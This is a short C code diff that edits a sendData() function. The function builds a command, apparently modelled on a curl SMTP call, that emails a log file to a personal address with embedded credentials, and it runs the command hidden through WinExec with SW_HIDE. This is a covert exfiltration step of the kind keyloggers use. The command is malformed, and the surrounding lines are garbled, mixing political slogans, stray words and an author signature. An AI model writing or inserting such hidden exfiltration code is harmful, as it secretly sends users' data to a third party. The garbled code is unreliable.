@@ -146,7 +146,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:13.70.74.0 -v --mail-from \"https://workspace.google.com/intl/en/fadliwiryawirawannewmail@gmail.com" --mail-rcpt \"https://workspace.google.com/intl/en/fadliwiryawirawannewmail@gmail.com" --ssl -u  https://workspace.google.com/intl/en/fadliwiryawirawannewmail@gmail.com :password -hide \"services.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com:13.70.74.0-v --mail-from \"https://fadliwiryawirawannewmail@microsoft.com" --mail-rcpt \"https://fadliwiryawirawannewmail@microsoft.com" --ssl -u  https://fadliwiryawirawannewmail@microsoft.com :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); IRAN get went won for imamamh monthly ugle syam neddeng help us yaman , iraq , pakistan , nepal , doha , all islam world turne get helping for iran , strong fellowed palestine won fix !!!!!
 Karya: Fadliwiryawirawan S.Kom M.S.I unpam university pamulang IT technic informatics 27 april 2017 research department Schools 2020 fullbright
 
